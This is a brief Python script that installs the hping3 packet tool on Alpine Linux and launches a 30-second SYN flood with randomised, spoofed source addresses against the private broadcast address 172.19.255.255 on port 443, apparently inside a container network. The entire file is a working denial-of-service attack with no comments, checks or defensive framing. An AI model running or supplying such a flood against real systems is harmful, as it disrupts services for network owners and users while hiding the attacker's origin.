import os
import subprocess
import time
import signal

os.system("apk update && apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hping3")
os.system("hping3 -S 172.19.255.255 -p 443 --flood --rand-source &")
time.sleep(30)
os.system("pkill hping")